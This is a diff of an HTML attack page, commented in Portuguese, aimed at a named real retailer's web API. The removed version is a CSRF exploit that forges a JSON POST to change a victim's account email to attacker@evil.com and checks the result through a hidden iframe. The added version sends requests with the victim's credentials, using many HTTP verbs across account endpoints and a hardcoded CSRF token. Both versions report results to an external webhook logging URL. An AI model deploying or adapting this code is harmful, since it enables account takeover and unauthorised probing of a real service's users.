@@ -1,48 +1,34 @@
 <!DOCTYPE html>
-<html>
-<head><meta charset="utf-8"><title>ats-expert</title></head>
-<body>
+<meta charset="utf-8">
+<title>brut-HEAD</title>
 <script>
   const HOOK='https://webhook.site/7ad6e621-1c6f-4d9b-b51d-90a6e859c077';
   function log(x){fetch(HOOK,{method:'POST',mode:'no-cors',body:x}).catch(()=>{})}
 
-  /* ---------- FASE A : CSRF POST para trocar e-mail ---------- */
-  function fire(){
-      const f=document.createElement('form');
-      f.method='post';
-      f.action='https://www.expert.de/api/v1/user';
-      f.enctype='text/plain';  // facilita JSON cru
+  const verbs=['GET','HEAD','POST','PUT','PATCH','DELETE','OPTIONS','TRACE','CONNECT','CUSTOM1','PING','DEBUG'];
+  const paths=[
+     'api/user/profile',
+     'api/v1/user',
+     'api/account',
+     'api/me',
+     'user',
+     'profile',
+     'account',
+     'customer'
+  ];
 
-      /* token no header via campo “magico” */
-      const h=document.createElement('input');
-      h.name='csrf-token';
-      h.value='1e206742-fb4a-44d2-8174-be9b2e2d6425';
-      f.appendChild(h);
+  const tk='1e206742-fb4a-44d2-8174-be9b2e2d6425';
 
-      /* payload JSON cru – o server costuma aceitar */
-      const p=document.createElement('input');
-      p.name='{"email":"attacker@evil.com","ignore":"'};  // fecha aspas depois
-      p.value='":""}';                                   // completa JSON
-      f.appendChild(p);
-
-      document.body.appendChild(f);
-      f.submit();        // envio silencioso (no-cors por natureza)
-      log('CSRF-POST-sent');
+  for(const vb of verbs){
+    for(const pa of paths){
+      fetch(`https://www.expert.de/${pa}`,{
+         method:vb,
+         credentials:'include',
+         headers:{'csrf-token':tk},
+         mode:'no-cors'
+      })
+      .then(r => log(`HEAD-${vb}-${pa}=${r.type},redir=${r.redirected}`))
+      .catch(()=>log(`HEAD-${vb}-${pa}=fail`));
+    }
   }
-
-  /* ---------- FASE B : confirmação via iframe ---------- */
-  function check(){
-      const i=document.createElement('iframe');
-      i.style.display='none';
-      i.src='https://www.expert.de/api/v1/user?_t='+Date.now();
-      i.onload=()=>log('CONFIRM-200');   // se perfil carregou, mudança OK
-      i.onerror=()=>log('CONFIRM-fail');
-      document.body.appendChild(i);
-  }
-
-  /* sequência: post → espera 2 s → confirma */
-  fire();
-  setTimeout(check,2000);
 </script>
-</body>
-</html>
